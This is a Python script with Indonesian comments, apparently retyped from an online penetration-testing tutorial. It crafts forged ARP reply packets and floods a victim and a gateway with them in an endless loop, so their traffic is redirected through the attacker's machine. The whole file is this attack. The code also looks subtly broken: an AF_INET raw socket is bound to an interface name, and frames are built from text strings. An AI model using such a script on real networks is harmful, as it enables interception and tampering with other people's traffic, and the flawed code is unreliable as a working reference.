# Kodingan bukan hasil sendiri, hanya kodingan dari internet yang diketik lagi
# kodingan bisa ditemukan di link ini https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_arp_spoofing.htm


# import module untuk dipakai
import socket
import struct
import binascii


# Kita buat socket untuk koneksi antara kita dengan client dan kita dengan server
# kita disini berperan seakan akan menjadi router antara client dgn server
# Ada 3 parameter yang akan kita masukan
# yang pertaman akan memberitahu kita tentang packet interface(AF_INET karena di windows)
# yang kedua akan memberitahu kita apabila dia adalah raw soket atau tidak
# yang ketiga memberi ketentuan protocol yang akan digunakan (kita memakai 0X0800 sebagai IP protokol kita)

# htons berfungsi mengubah 0x0800 jadi bit
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket. htons(0x0800))
s.bind(("eth0", socket.htons(0x0800)))


# setelah jalur koneksi selesai, kita siapkan mac addres dari penyerang, client dan gatewaynya
attackrmac = '\x00\x0c\x29\x4f\x8e\x76'
victimmac = '\x00\x0C\x29\x2E\x84\x5A'
gatewaymac = '\x00\x50\x56\xC0\x00\x28'
# mac nya dibuat dalam hexadecimal nnti akan dibaca sebagai bit oleh function seperti htons


# kita berikan protocol untuk ARP nya
code = '\x08\x06'


# ada 2 paket ethernet yang kita sudah buat, satu untuk client dan satu lagi uuntuk gateway
ethernet1 = victimmac + attackrmac + code
ethernet2 = gatewaymac + attackrmac + code


# disamakan dengan header ARP nya
htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'


# sekarang kita kasih IP address gateway dan client
gateway_ip = '192.168.43.85' #asumsi ip gateway
victim_ip = '192.168.43.131' #asumsi ip client


# ubah IP address diatas ke hexadecimal memakai function socket.inet_aton()
gatewayip = socket.inet_aton(gateway_ip)
victimip = socket.inet_aton(victim_ip)


# terakhir execute code seperti berikut untuk mengubah IP address dari gateway nya agar jadi ke arah kita
victim_ARP = ethernet1 + htype + protype + hsize + psize + opcode + attackrmac + gatewayip + victimmac + victimip
gateway_ARP = ethernet2 + htype + protype + hsize + psize + opcode + attackrmac + victimip + gatewaymac + gatewayip

while 1:
    s.send(victim_ARP)
    s.send(gateway_ARP)



# Kodingan bukan hasil sendiri, hanya kodingan dari internet yang diketik lagi
# kodingan bisa ditemukan di link ini https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_arp_spoofing.htm

